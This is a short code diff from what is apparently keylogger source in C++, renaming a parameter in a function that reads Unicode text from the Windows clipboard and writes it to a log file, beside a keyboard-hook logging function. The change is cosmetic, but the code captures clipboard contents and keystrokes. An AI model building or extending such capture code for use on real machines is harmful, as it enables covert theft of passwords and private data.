@@ -32,13 +32,13 @@ void keylogger::log_kbd(const KBDLLHOOKSTRUCT* kbd_hook)
     }
 }
 
-void keylogger::write_clipboard_data(std::wofstream& stream)
+void keylogger::write_clipboard_data(std::wofstream& file)
 {
     if (OpenClipboard(nullptr))
     {
         if (auto handle = GetClipboardData(CF_UNICODETEXT))
         {
-            stream << static_cast<WCHAR*>(GlobalLock(handle));
+            file << static_cast<WCHAR*>(GlobalLock(handle));
 
             GlobalUnlock(handle);
         }
